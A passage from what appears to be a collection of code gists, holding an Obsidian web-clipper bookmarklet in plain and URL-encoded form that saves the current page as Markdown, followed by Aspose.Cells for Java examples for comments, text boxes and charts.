 var container = document.createElement(""div"");
 for (var i = 0, len = sel.rangeCount; i < len; ++i) {
 container.appendChild(sel.getRangeAt(i).cloneContents());
 }
 html = container.innerHTML;
 }
 } else if (typeof document.selection != ""undefined"") {
 if (document.selection.type == ""Text"") {
 html = document.selection.createRange().htmlText;
 }
 }
 return html;
 }


 const selection = getSelectionHtml();


 const {
      title,
      byline,
      content
 } = new Readability(document.cloneNode(true)).parse();


 function getFileName(fileName) {
 var userAgent = window.navigator.userAgent,
 platform = window.navigator.platform,
 windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];


 if (windowsPlatforms.indexOf(platform) !== -1) {
 fileName = fileName.replace(':', '').replace(/[/\\?%*|""<>]/g, '-');
 } else {
 fileName = fileName.replace(':', '').replace(/\//g, '-').replace(/\\/g, '-');
 }
 return fileName;
 }
 const fileName = getFileName(title);


 if (selection) {
 var markdownify = selection;
 } else {
 var markdownify = content;
 }


 if (vault) {
 var vaultName = '&vault=' + encodeURIComponent(`${vault}`);
 } else {
 var vaultName = '';
 }


 const markdownBody = new Turndown({
 headingStyle: 'atx',
 hr: '---',
 bulletListMarker: '-',
 codeBlockStyle: 'fenced',
 emDelimiter: '*',
 }).turndown(markdownify);


 var date = new Date();


 function convertDate(date) {
 var yyyy = date.getFullYear().toString();
 var mm = (date.getMonth()+1).toString();
 var dd = date.getDate().toString();
 var mmChars = mm.split('');
 var ddChars = dd.split('');
 return yyyy + '-' + (mmChars[1]?mm:""0""+mmChars[0]) + '-' + (ddChars[1]?dd:""0""+ddChars[0]);
 }


 const today = convertDate(date);


 // Utility function to get meta content by name or property
 function getMetaContent(attr, value) {
 var element = document.querySelector(`meta[${attr}='${value}']`);
 return element ? element.getAttribute(""content"").trim() : """";
 }


 // Fetch byline, meta author, property author, or site name
 var author = byline || getMetaContent(""name"", ""author"") || getMetaContent(""property"", ""author"") || getMetaContent(""property"", ""og:site_name"");


 // Check if there's an author and add brackets
 var authorBrackets = author ? `""[[${author}]]""` : """";




 /* Try to get published date */
 var timeElement = document.querySelector(""time"");
 var publishedDate = timeElement ? timeElement.getAttribute(""datetime"") : """";


 if (publishedDate && publishedDate.trim() !== """") {
 var date = new Date(publishedDate);
 var year = date.getFullYear();
 var month = date.getMonth() + 1; // Months are 0-based in JavaScript
 var day = date.getDate();


 // Pad month and day with leading zeros if necessary
 month = month < 10 ? '0' + month : month;
 day = day < 10 ? '0' + day : day;


 var published = year + '-' + month + '-' + day;
 } else {
 var published = ''
 }


 /* YAML front matter as tags render cleaner with special chars  */
 const fileContent = 
 '---\n'
 + 'category: ""[[Clippings]]""\n'
 + 'author: ' + authorBrackets + '\n'
 + 'title: ""' + title + '""\n'
 + 'source: ' + document.URL + '\n'
 + 'clipped: ' + today + '\n'
 + 'published: ' + published + '\n' 
 + 'topics: \n'
 + 'tags: [' + tags + ']\n'
 + '---\n\n'
 + markdownBody ;


 document.location.href = ""obsidian://new?""
 + ""file="" + encodeURIComponent(folder + fileName)
 + ""&content="" + encodeURIComponent(fileContent)
 + vaultName ;


})
javascript:(function()%7Bjavascript%3A%20Promise.all(%5Bimport('https%3A%2F%2Funpkg.com%2Fturndown%406.0.0%3Fmodule')%2C%20import('https%3A%2F%2Funpkg.com%2F%40tehshrike%2Freadability%400.2.0')%2C%20%5D).then(async%20(%5B%7B%0A%20%20%20%20default%3A%20Turndown%0A%7D%2C%20%7B%0A%20%20%20%20default%3A%20Readability%0A%7D%5D)%20%3D%3E%20%7B%0A%0A%20%20%2F*%20Optional%20vault%20name%20*%2F%0A%20%20const%20vault%20%3D%20%22%22%3B%0A%0A%20%20%2F*%20Optional%20folder%20name%20such%20as%20%22Clippings%2F%22%20*%2F%0A%20%20const%20folder%20%3D%20%22Clippings%2F%22%3B%0A%0A%20%20%2F*%20Optional%20tags%20%20*%2F%0A%20%20let%20tags%20%3D%20%22clippings%22%3B%0A%0A%20%20%2F*%20Parse%20the%20site's%20meta%20keywords%20content%20into%20tags%2C%20if%20present%20*%2F%0A%20%20if%20(document.querySelector('meta%5Bname%3D%22keywords%22%20i%5D'))%20%7B%0A%20%20%20%20%20%20var%20keywords%20%3D%20document.querySelector('meta%5Bname%3D%22keywords%22%20i%5D').getAttribute('content').split('%2C')%3B%0A%0A%20%20%20%20%20%20keywords.forEach(function(keyword)%20%7B%0A%20%20%20%20%20%20%20%20%20%20let%20tag%20%3D%20'%20'%20%2B%20keyword.split('%20').join('')%3B%0A%20%20%20%20%20%20%20%20%20%20tags%20%2B%3D%20tag%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%7D%0A%0A%20%20function%20getSelectionHtml()%20%7B%0A%20%20%20%20var%20html%20%3D%20%22%22%3B%0A%20%20%20%20if%20(typeof%20window.getSelection%20!%3D%20%22undefined%22)%20%7B%0A%20%20%20%20%20%20%20%20var%20sel%20%3D%20window.getSelection()%3B%0A%20%20%20%20%20%20%20%20if%20(sel.rangeCount)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20container%20%3D%20document.createElement(%22div%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20(var%20i%20%3D%200%2C%20len%20%3D%20sel.rangeCount%3B%20i%20%3C%20len%3B%20%2B%2Bi)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20container.appendChild(sel.getRangeAt(i).cloneContents())%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20html%20%3D%20container.innerHTML%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%20else%20if%20(typeof%20document.selection%20!%3D%20%22undefined%22)%20%7B%0A%20%20%20%20%20%20%20%20if%20(document.selection.type%20%3D%3D%20%22Text%22)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20html%20%3D%20document.selection.createRange().htmlText%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20return%20html%3B%0A%20%20%7D%0A%0A%20%20const%20selection%20%3D%20getSelectionHtml()%3B%0A%0A%20%20const%20%7B%0A%20%20%20%20%20%20title%2C%0A%20%20%20%20%20%20byline%2C%0A%20%20%20%20%20%20content%0A%20%20%7D%20%3D%20new%20Readability(document.cloneNode(true)).parse()%3B%0A%0A%20%20function%20getFileName(fileName)%20%7B%0A%20%20%20%20var%20userAgent%20%3D%20window.navigator.userAgent%2C%0A%20%20%20%20%20%20%20%20platform%20%3D%20window.navigator.platform%2C%0A%20%20%20%20%20%20%20%20windowsPlatforms%20%3D%20%5B'Win32'%2C%20'Win64'%2C%20'Windows'%2C%20'WinCE'%5D%3B%0A%0A%20%20%20%20if%20(windowsPlatforms.indexOf(platform)%20!%3D%3D%20-1)%20%7B%0A%20%20%20%20%20%20fileName%20%3D%20fileName.replace('%3A'%2C%20'').replace(%2F%5B%2F%5C%5C%3F%25*%7C%22%3C%3E%5D%2Fg%2C%20'-')%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20fileName%20%3D%20fileName.replace('%3A'%2C%20'').replace(%2F%5C%2F%2Fg%2C%20'-').replace(%2F%5C%5C%2Fg%2C%20'-')%3B%0A%20%20%20%20%7D%0A%20%20%20%20return%20fileName%3B%0A%20%20%7D%0A%20%20const%20fileName%20%3D%20getFileName(title)%3B%0A%0A%20%20if%20(selection)%20%7B%0A%20%20%20%20%20%20var%20markdownify%20%3D%20selection%3B%0A%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20var%20markdownify%20%3D%20content%3B%0A%20%20%7D%0A%0A%20%20if%20(vault)%20%7B%0A%20%20%20%20%20%20var%20vaultName%20%3D%20'%26vault%3D'%20%2B%20encodeURIComponent(%60%24%7Bvault%7D%60)%3B%0A%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20var%20vaultName%20%3D%20''%3B%0A%20%20%7D%0A%0A%20%20const%20markdownBody%20%3D%20new%20Turndown(%7B%0A%20%20%20%20%20%20headingStyle%3A%20'atx'%2C%0A%20%20%20%20%20%20hr%3A%20'---'%2C%0A%20%20%20%20%20%20bulletListMarker%3A%20'-'%2C%0A%20%20%20%20%20%20codeBlockStyle%3A%20'fenced'%2C%0A%20%20%20%20%20%20emDelimiter%3A%20'*'%2C%0A%20%20%7D).turndown(markdownify)%3B%0A%0A%20%20var%20date%20%3D%20new%20Date()%3B%0A%0A%20%20function%20convertDate(date)%20%7B%0A%20%20%20%20var%20yyyy%20%3D%20date.getFullYear().toString()%3B%0A%20%20%20%20var%20mm%20%3D%20(date.getMonth()%2B1).toString()%3B%0A%20%20%20%20var%20dd%20%20%3D%20date.getDate().toString()%3B%0A%20%20%20%20var%20mmChars%20%3D%20mm.split('')%3B%0A%20%20%20%20var%20ddChars%20%3D%20dd.split('')%3B%0A%20%20%20%20return%20yyyy%20%2B%20'-'%20%2B%20(mmChars%5B1%5D%3Fmm%3A%220%22%2BmmChars%5B0%5D)%20%2B%20'-'%20%2B%20(ddChars%5B1%5D%3Fdd%3A%220%22%2BddChars%5B0%5D)%3B%0A%20%20%7D%0A%0A%20%20const%20today%20%3D%20convertDate(date)%3B%0A%0A%20%20%2F%2F%20Utility%20function%20to%20get%20meta%20content%20by%20name%20or%20property%0A%20%20function%20getMetaContent(attr%2C%20value)%20%7B%0A%20%20%20%20%20%20var%20element%20%3D%20document.querySelector(%60meta%5B%24%7Battr%7D%3D'%24%7Bvalue%7D'%5D%60)%3B%0A%20%20%20%20%20%20return%20element%20%3F%20element.getAttribute(%22content%22).trim()%20%3A%20%22%22%3B%0A%20%20%7D%0A%0A%20%20%2F%2F%20Fetch%20byline%2C%20meta%20author%2C%20property%20author%2C%20or%20site%20name%0A%20%20var%20author%20%3D%20byline%20%7C%7C%20getMetaContent(%22name%22%2C%20%22author%22)%20%7C%7C%20getMetaContent(%22property%22%2C%20%22author%22)%20%7C%7C%20getMetaContent(%22property%22%2C%20%22og%3Asite_name%22)%3B%0A%0A%20%20%2F%2F%20Check%20if%20there's%20an%20author%20and%20add%20brackets%0A%20%20var%20authorBrackets%20%3D%20author%20%3F%20%60%22%5B%5B%24%7Bauthor%7D%5D%5D%22%60%20%3A%20%22%22%3B%0A%0A%0A%20%20%2F*%20Try%20to%20get%20published%20date%20*%2F%0A%20%20var%20timeElement%20%3D%20document.querySelector(%22time%22)%3B%0A%20%20var%20publishedDate%20%3D%20timeElement%20%3F%20timeElement.getAttribute(%22datetime%22)%20%3A%20%22%22%3B%0A%0A%20%20if%20(publishedDate%20%26%26%20publishedDate.trim()%20!%3D%3D%20%22%22)%20%7B%0A%20%20%20%20%20%20var%20date%20%3D%20new%20Date(publishedDate)%3B%0A%20%20%20%20%20%20var%20year%20%3D%20date.getFullYear()%3B%0A%20%20%20%20%20%20var%20month%20%3D%20date.getMonth()%20%2B%201%3B%20%2F%2F%20Months%20are%200-based%20in%20JavaScript%0A%20%20%20%20%20%20var%20day%20%3D%20date.getDate()%3B%0A%0A%20%20%20%20%20%20%2F%2F%20Pad%20month%20and%20day%20with%20leading%20zeros%20if%20necessary%0A%20%20%20%20%20%20month%20%3D%20month%20%3C%2010%20%3F%20'0'%20%2B%20month%20%3A%20month%3B%0A%20%20%20%20%20%20day%20%3D%20day%20%3C%2010%20%3F%20'0'%20%2B%20day%20%3A%20day%3B%0A%0A%20%20%20%20%20%20var%20published%20%3D%20year%20%2B%20'-'%20%2B%20month%20%2B%20'-'%20%2B%20day%3B%0A%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20var%20published%20%3D%20''%0A%20%20%7D%0A%0A%20%20%2F*%20YAML%20front%20matter%20as%20tags%20render%20cleaner%20with%20special%20chars%20%20*%2F%0A%20%20const%20fileContent%20%3D%20%0A%20%20%20%20%20%20'---%5Cn'%0A%20%20%20%20%20%20%2B%20'category%3A%20%22%5B%5BClippings%5D%5D%22%5Cn'%0A%20%20%20%20%20%20%2B%20'author%3A%20'%20%2B%20authorBrackets%20%2B%20'%5Cn'%0A%20%20%20%20%20%20%2B%20'title%3A%20%22'%20%2B%20title%20%2B%20'%22%5Cn'%0A%20%20%20%20%20%20%2B%20'source%3A%20'%20%2B%20document.URL%20%2B%20'%5Cn'%0A%20%20%20%20%20%20%2B%20'clipped%3A%20'%20%2B%20today%20%2B%20'%5Cn'%0A%20%20%20%20%20%20%2B%20'published%3A%20'%20%2B%20published%20%2B%20'%5Cn'%20%0A%20%20%20%20%20%20%2B%20'topics%3A%20%5Cn'%0A%20%20%20%20%20%20%2B%20'tags%3A%20%5B'%20%2B%20tags%20%2B%20'%5D%5Cn'%0A%20%20%20%20%20%20%2B%20'---%5Cn%5Cn'%0A%20%20%20%20%20%20%2B%20markdownBody%20%3B%0A%0A%20%20%20document.location.href%20%3D%20%22obsidian%3A%2F%2Fnew%3F%22%0A%20%20%20%20%2B%20%22file%3D%22%20%2B%20encodeURIComponent(folder%20%2B%20fileName)%0A%20%20%20%20%2B%20%22%26content%3D%22%20%2B%20encodeURIComponent(fileContent)%0A%20%20%20%20%2B%20vaultName%20%3B%0A%0A%7D)%7D)()%3B
"
"AddImageToComment-1.java
","// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = """";


// Create directory if it is not already present.
File file = new File(dataDir);
if(!file.exists())
 file.mkdir();


// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Get a reference of comments collection with the first sheet
com.aspose.cells.CommentCollection comments = workbook.getWorksheets().get(0).getComments();


// Add a comment to cell A1
int commentIndex = comments.add(0, 0);
com.aspose.cells.Comment comment = comments.get(commentIndex);
comment.setNote(""First note."");
comment.getFont().setName(""Times New Roman"");


// Load an image
String filename = dataDir + ""image.jpg"";
byte[] result = null;
java.nio.channels.FileChannel fc = null;
try {
 fc = new java.io.RandomAccessFile(filename, ""r"").getChannel();
 java.nio.MappedByteBuffer byteBuffer = fc.map(java.nio.channels.FileChannel.MapMode.READ_ONLY, 0,
 fc.size()).load();
 System.out.println(byteBuffer.isLoaded());
 result = new byte[(int) fc.size()];
 if (byteBuffer.remaining() > 0) {
 byteBuffer.get(result, 0, byteBuffer.remaining());
    }
} catch (IOException e) {
 throw e;
} finally {
 try {
 fc.close();
      } catch (IOException e) {
 throw e;
      }
}
// Set image data to the shape associated with the comment
comment.getCommentShape().getFill().setImageData(result);


// Saving the Excel file
workbook.save(dataDir + ""book1.out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = """";


// Create directory if it is not already present.
File file = new File(dataDir);
if(!file.exists())
 file.mkdir();


// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Adding a new worksheet to the Workbook object
int sheetIndex = workbook.getWorksheets().add();


// Obtaining the reference of the newly added worksheet by passing its sheet index
Worksheet worksheet = workbook.getWorksheets().get(sheetIndex);


// Adding a comment to ""F5"" cell
int commentIndex = worksheet.getComments().add(""F5"");


// Accessing the newly added comment
com.aspose.cells.Comment comment = worksheet.getComments().get(commentIndex);


// Setting the comment note
comment.setNote( ""Hello Aspose!"");


// Saving the Excel file
workbook.save(dataDir + ""book1.out.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = """";


// Create directory if it is not already present.
File file = new File(dataDir);
if(!file.exists())
 file.mkdir();




// Open an Excel file.
//Workbook workbook = new Workbook(dataDir+ ""Book_SourceData.xlsx"");//If you want to insert a text box in an existing file, use this code.


// Create an object of the Workbook class
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the TextBox to the worksheet
sheet.getTextBoxes().add(6, 10, 100, 200);


//Save.You can check your text box in this way.
workbook.save(""result.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = """";
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Add Author
int authorIndex = workbook.getWorksheets().getThreadedCommentAuthors().add(""Aspose Test"", """", """");
ThreadedCommentAuthor author = workbook.getWorksheets().getThreadedCommentAuthors().get(authorIndex);
 
// Add Threaded Comment
workbook.getWorksheets().get(0).getComments().addThreadedComment(""A1"", ""Test Threaded Comment"", author);


workbook.save(dataDir + ""AddThreadedComments_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// The path to the documents directory.
String dataDir = """";
File file = new File(dataDir);
if(!file.exists())
 file.mkdir();


//Instantiating a Workbook object
Workbook workbook = new Workbook();


ShapeCollection shapes = workbook.getWorksheets().get(0).getShapes();


//add a TextBox
Shape shape = shapes.addTextBox(2, 0, 2, 0, 50, 120);
shape.setText(""This is a test."");


//set alignment
shape.setTextHorizontalAlignment(TextAlignmentType.CENTER);
shape.setTextVerticalAlignment(TextAlignmentType.CENTER);


//Save the excel file.
workbook.save(dataDir + ""result.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Intialize an object of the Workbook class to load template file
Workbook sourceWb = new Workbook(""SampleTextboxExcel2016.xlsx"");


// Access the target textbox whose text is to be aligned
Shape sourceTextBox = sourceWb.getWorksheets().get(0).getShapes().get(0);


// Create and object of the target workbook
Workbook destWb = new Workbook();


// Access first worksheet from the collection
Worksheet _sheet = destWb.getWorksheets().get(0);


// Create new textbox
TextBox _textBox = (TextBox)_sheet.getShapes().addShape(6,1, 0, 1, 0, 200, 200);


// Use Html string from a template file textbox
_textBox.setHtmlText(sourceTextBox.getHtmlText());


// Save the workbook on disc
destWb.save(""Output.xlsx"");
This Gist contains code example snippets for Aspose.Cells for Java.
//Instantiating an Workbook object
Workbook workbook = new Workbook();
//Obtaining the reference of the newly added worksheet
Worksheet ws = workbook.getWorksheets().get(0);
Cells cells = ws.getCells();


//Setting the value to the cells
Cell cell = cells.get(""A1"");
cell.putValue(""Fruit"");
cell = cells.get(""B1"");
cell.putValue(""Count"");
cell = cells.get(""C1"");
cell.putValue(""Price"");


cell = cells.get(""A2"");
cell.putValue(""Apple"");
cell = cells.get(""A3"");
cell.putValue(""Mango"");
cell = cells.get(""A4"");
cell.putValue(""Blackberry"");
cell = cells.get(""A5"");
cell.putValue(""Cherry"");


cell = cells.get(""B2"");
cell.putValue(5);
cell = cells.get(""B3"");
cell.putValue(3);
cell = cells.get(""B4"");
cell.putValue(6);
cell = cells.get(""B5"");
cell.putValue(4);


cell = cells.get(""C2"");
cell.putValue(5);
cell = cells.get(""C3"");
cell.putValue(20);
cell = cells.get(""C4"");
cell.putValue(30);
cell = cells.get(""C5"");
cell.putValue(60);


cell = cells.get(""E10"");
Style temp = workbook.createStyle();
temp.getFont().setColor(Color.getRed());
cell.setStyle(temp);




// Get max display range of worksheet
Range range = cells.getMaxDisplayRange();


//get maximum row index of cell which contains data.
System.out.println(cells.getMaxRow());


//get maximum row index of cell which contains data or style.
System.out.println(cells.getMaxDataRow());


//get maximum column index of cell which contains data.
System.out.println(cells.getMaxColumn());


//get maximum column index of cell which contains data or style.
System.out.println(cells.getMaxDataColumn());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = """";
// Instantiate a new Workbook
Workbook workbook = new Workbook();
// Get the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


//Add some text in cell A1
worksheet.getCells().get(""A1"").putValue(""Here"");


// Add a comment to A1 cell
Comment comment = worksheet.getComments().get(worksheet.getComments().add(""A1""));
// Set its vertical alignment setting
comment.getCommentShape().setTextVerticalAlignment(TextAlignmentType.CENTER);
// Set the Comment note
comment.setNote(""This is my Comment Text. This is test"");


Shape shape = worksheet.getComments().get(""A1"").getCommentShape();


shape.getFill().getSolidFill().setColor(Color.getBlack());
Font font = shape.getFont();
font.setColor(Color.getWhite());
StyleFlag styleFlag = new StyleFlag();
styleFlag.setFontColor(true);
shape.getTextBody().format(0, shape.getText().length(), font, styleFlag);


// Save the Excel file
workbook.save(dataDir + ""outputChangeCommentFontColor.xlsx"");
// Instantiating a Workbook object
 Workbook workbook = new Workbook();


 // Obtaining the reference of first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 // Accessing the ""A1"" cell from the worksheet
 Cell cell = worksheet.getCells().get(""A1"");


 // Adding some value to the ""A1"" cell
 cell.putValue(""I am using the latest version of Aspose.Cells to test this functionality."");


 // Gets style in the ""A1"" cell
 Style style = cell.getStyle();


 // Shrinking the text to fit according to the dimensions of the cell
 style.setTextDirection(TextDirectionType.LEFT_TO_RIGHT);


 cell.setStyle(style);
 
 
 
 // Saving the Excel file
 workbook.save(""book1.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = """";
// Instantiate a new Workbook
Workbook wb = new Workbook();
// Get the first worksheet
Worksheet sheet = wb.getWorksheets().get(0);


// Add a comment to A1 cell
Comment comment = sheet.getComments().get(sheet.getComments().add(""A1""));
// Set its vertical alignment setting
comment.getCommentShape().setTextVerticalAlignment(TextAlignmentType.CENTER);
// Set its horizontal alignment setting
comment.getCommentShape().setTextHorizontalAlignment(TextAlignmentType.RIGHT);
// Set the Text Direction - Right-to-Left
comment.getCommentShape().setTextDirection(TextDirectionType.RIGHT_TO_LEFT);
// Set the Comment note
comment.setNote(""This is my Comment Text. This is test"");


// Save the Excel file
wb.save(dataDir + ""outCommentShape1.xlsx"");
 // Instantiating a Workbook object
 Workbook workbook = new Workbook();


 // Adding a new worksheet to the Workbook object
 int sheetIndex = workbook.getWorksheets().add();


 // Obtaining the reference of the newly added worksheet by passing its sheet index
 Worksheet worksheet = workbook.getWorksheets().get(sheetIndex);


 // Adding sample values to cells
 worksheet.getCells().get(""A1"").putValue(""Series1"");
 worksheet.getCells().get(""A2"").putValue(50);
 worksheet.getCells().get(""A3"").putValue(100);
 worksheet.getCells().get(""A4"").putValue(150);
 worksheet.getCells().get(""B1"").putValue(""Series2"");
 worksheet.getCells().get(""B2"").putValue(60);
 worksheet.getCells().get(""B3"").putValue(32);
 worksheet.getCells().get(""B4"").putValue(50);


 // Adding a chart to the worksheet
 int chartIndex = worksheet.getCharts().add(ChartType.COLUMN, 5, 0, 15, 5);


 // Accessing the instance of the newly added chart
 Chart chart = worksheet.getCharts().get(chartIndex);
 // Adding SeriesCollection (chart data source) to the chart ranging from ""A1"" cell to ""B3""
 chart.setChartDataRange(""A1:B4"",true);


 //hiding X axis
 chart.getCategoryAxis().setVisible(false);


 // Setting max value of Y axis.
 chart.getValueAxis().setMaxValue(200);
 // Setting major unit.
 chart.getValueAxis().setMajorUnit(50);


 // Save the file
 workbook.save(""chart_axes.xlsx"");
// Instantiating a Workbook object
 Workbook workbook = new Workbook();


 // Adding a new worksheet to the Workbook object
 int sheetIndex = workbook.getWorksheets().add();


 // Obtaining the reference of the newly added worksheet by passing its sheet index
 Worksheet worksheet = workbook.getWorksheets().get(sheetIndex);


 // Adding sample values to cells
 worksheet.getCells().get(""A1"").putValue(""Series1"");
 worksheet.getCells().get(""A2"").putValue(50);
 worksheet.getCells().get(""A3"").putValue(100);
 worksheet.getCells().get(""A4"").putValue(150);
 worksheet.getCells().get(""B1"").putValue(""Series2"");
 worksheet.getCells().get(""B2"").putValue(60);
 worksheet.getCells().get(""B3"").putValue(32);
 worksheet.getCells().get(""B4"").putValue(50);


 // Adding a chart to the worksheet
 int chartIndex = worksheet.getCharts().add(ChartType.COLUMN, 5, 0, 15, 5);


 // Accessing the instance of the newly added chart
 Chart chart = worksheet.getCharts().get(chartIndex);
 // Adding SeriesCollection (chart data source) to the chart ranging from ""A1"" cell to ""B3""
 chart.getNSeries().add(""A1:B3"", true);
 //Show value labels
 chart.getNSeries().get(0).getDataLabels().setShowValue(true);
 //Show series name labels
 chart.getNSeries().get(1).getDataLabels().setShowSeriesName(true);
 //Move labels to center
 chart.getNSeries().get(1).getDataLabels().setPosition(LabelPositionType.CENTER);




 // Save the file
 workbook.save(""chart_datalabels.xlsx"");
 // Instantiating a Workbook object
 Workbook workbook = new Workbook();


 // Adding a new worksheet to the Workbook object
 int sheetIndex = workbook.getWorksheets().add();


 // Obtaining the reference of the newly added worksheet by passing its sheet index
 Worksheet worksheet = workbook.getWorksheets().get(sheetIndex);


 // Adding sample values to cells
 worksheet.getCells().get(""A1"").putValue(""Series1"");
 worksheet.getCells().get(""A2"").putValue(50);
 worksheet.getCells().get(""A3"").putValue(100);
 worksheet.getCells().get(""A4"").putValue(150);
 worksheet.getCells().get(""B1"").putValue(""Series2"");
 worksheet.getCells().get(""B2"").putValue(60);
 worksheet.getCells().get(""B3"").putValue(32);
 worksheet.getCells().get(""B4"").putValue(50);


 // Adding a chart to the worksheet
 int chartIndex = worksheet.getCharts().add(ChartType.COLUMN, 5, 0, 15, 5);


 // Accessing the instance of the newly added chart
 Chart chart = worksheet.getCharts().get(chartIndex);
 // Adding SeriesCollection (chart data source) to the chart ranging from ""A1"" cell to ""B3""
 chart.getNSeries().add(""A1:B3"", true);


 // Move the legend to left
 chart.getLegend().setPosition(LegendPositionType.LEFT);


 // Set font color of the legend
 chart.getLegend().getFont().setColor(Color.getBlue());




 // Save the file
 workbook.save(""chart_datalabels.xlsx"");
Workbook workbook = new Workbook(""combo.xlsx"");
Worksheet worksheet = workbook.getWorksheets().get(0);
int i  = worksheet.getCharts().add(ChartType.STOCK_VOLUME_HIGH_LOW_CLOSE,15, 0, 35, 12);
Chart chart = worksheet.getCharts().get(i);
chart.setShowLegend(true);
chart.getTitle().setText(""Combo Chart"");
chart.getTitle().setVisible(true);
chart.getLegend().setPosition(LegendPositionType.BOTTOM);
chart.setChartDataRange(""A1:E12"",true);
chart.getNSeries().setCategoryData(""A2:A12"");
for(int j = 0;j<chart.getNSeries().getCount();j++)
{
 switch (j) {
 case 1:
 chart.getNSeries().get(j).getMarker().setMarkerStyle(ChartMarkerType.CIRCLE);
 chart.getNSeries().get(j).getMarker().setMarkerSize(15);
 chart.getNSeries().get(j).getMarker().getArea().setFormatting(FormattingType.CUSTOM);
 chart.getNSeries().get(j).getMarker().getArea().setForegroundColor(com.aspose.cells.Color.getPink());
 chart.getNSeries().get(j).getBorder().setVisible(false);
 break;
 case 2:
 chart.getNSeries().get(j).getMarker().setMarkerStyle(ChartMarkerType.DASH);
 chart.getNSeries().get(j).getMarker().setMarkerSize(15);
 chart.getNSeries().get(j).getMarker().getArea().setFormatting(FormattingType.CUSTOM);
 chart.getNSeries().get(j).getMarker().getArea().setForegroundColor(com.aspose.cells.Color.getOrange());
 chart.getNSeries().get(j).getBorder().setVisible(false);
 break;
 case 3:
 chart.getNSeries().get(j).getMarker().setMarkerStyle(ChartMarkerType.SQUARE);
 chart.getNSeries().get(j).getMarker().setMarkerSize(15);
 chart.getNSeries().get(j).getMarker().getArea().setFormatting(FormattingType.CUSTOM);
 chart.getNSeries().get(j).getMarker().getArea().setForegroundColor(com.aspose.cells.Color.getLightBlue());
 chart.getNSeries().get(j).getBorder().setVisible(false);
 break;
    }
}


chart.getNSeries().get(0).setType(ChartType.LINE);


chart.getPlotArea().getArea().setFormatting(FormattingType.NONE);


workbook.save(""out.xlsx"");
// Create an instance of Workbook
Workbook workbook = new Workbook(""Volume-High-Low-Close.xlsx"");
// Access the first worksheet.
Worksheet worksheet = workbook.getWorksheets().get(0);
//Create High-Low-Close-Stock Chart
int pieIdx = worksheet.getCharts().add(ChartType.STOCK_VOLUME_HIGH_LOW_CLOSE, 5, 6, 20, 12);
// Retrieve the Chart object
Chart chart = worksheet.getCharts().get(pieIdx);
// Set the legend can be showed
chart.setShowLegend(true);
// Set the chart title name 
chart.getTitle().setText(""Volume-High-Low-Close Stock"");
// Set the Legend at the bottom of the chart area
chart.getLegend().setPosition(LegendPositionType.BOTTOM);
// Set data range
chart.setChartDataRange(""A1:E9"", true);
// Set category data 
chart.getNSeries().setCategoryData(""A2:A9"");
// Set Color for the first series(Volume) data 
chart.getNSeries().get(0).getArea().setForegroundColor(Color.fromArgb(79, 129,189));
// Fill the PlotArea area with nothing 
chart.getPlotArea().getArea().getFillFormat().setFillType(FillType.NONE);
// Save the Excel file
workbook.save(""out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Converting integer enums to string enums
java.util.HashMap<Integer, String> cvTypes = new java.util.HashMap<Integer, String>();
cvTypes.put(CellValueType.IS_NUMERIC, ""IsNumeric"");
cvTypes.put(CellValueType.IS_STRING, ""IsString"");


//Load sample Excel file containing chart.
Workbook wb = new Workbook(srcDir + ""sampleFindTypeOfXandYValuesOfPointsInChartSeries.xlsx"");


//Access first worksheet.
Worksheet ws = wb.getWorksheets().get(0);


//Access first chart.
Chart ch = ws.getCharts().get(0);


//Calculate chart data.
ch.calculate();


//Access first chart point in the first series.
ChartPoint pnt = ch.getNSeries().get(0).getPoints().get(0);


//Print the types of X and Y values of chart point.
System.out.println(""X Value Type: "" + cvTypes.get(pnt.getXValueType()));
System.out.println(""Y Value Type: "" + cvTypes.get(pnt.getYValueType()));
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the sample Excel file
Workbook wb = new Workbook(""sampleHandleAutomaticUnitsOfChartAxisLikeMicrosoftExcel.xlsx"");


//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


//Access first chart
Chart ch = ws.getCharts().get(0);


//Render chart to pdf
ch.toPdf(""outputHandleAutomaticUnitsOfChartAxisLikeMicrosoftExcel.pdf"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the Excel file containing chart
Workbook wb = new Workbook(""sampleReadAxisLabelsAfterCalculatingTheChart.xlsx"");


//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


